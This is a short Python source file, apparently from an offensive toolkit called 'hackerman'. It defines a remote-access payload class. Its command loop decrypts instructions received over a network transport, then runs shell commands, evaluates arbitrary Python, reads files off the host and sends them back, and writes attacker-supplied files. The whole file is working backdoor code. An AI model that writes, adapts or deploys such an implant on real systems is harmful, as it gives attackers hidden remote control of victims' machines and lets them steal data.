from hackerman import utils
import json

class BasePayload(object):
	def __init__(self, transport, crypto):
		self.conn = transport
		self.encrypt = crypto.encrypt
		self.decrypt = crypto.decrypt
		self.exit_trigger = False
	def do_cmd(self, cmd):
		if cmd['type'] == 'sh':
			cmd['res'] = utils.sh(cmd['cmd'])
		elif cmd['type'] == 'eval':
			try:
				r = eval(cmd['cmd'])
			except Exception as e:
				r = e
			cmd['res'] = r
		elif cmd['type'] == 'dl':
			try:
				fd = open(cmd['fn'],'rb').read()
			except Exception as e:
				fd = e
			cmd['res'] = fd 
		elif cmd['type'] == 'ul':
			try:
				with open(cmd['fn'],'wb') as f:
					f.write(cmd['fd'])
				r = True
			except Exception as e:
				r = e
			cmd['res'] = r
		elif cmd['type'] == 'exit':
			cmd['res'] = 'okay'
			self.exit_trigger = True
		return cmd
	def run(self):
		while True:
			try:
				dat = self.conn.recv()
				dec = self.decrypt(dat)

				cmd = json.loads(dec.decode())
				res = self.do_cmd(cmd)

				txt = json.dumps(res)
				enc = self.encrypt(txt.encode())

				self.conn.send(enc)

				if self.exit_trigger:
					break
			except Exception as e:
				print(e)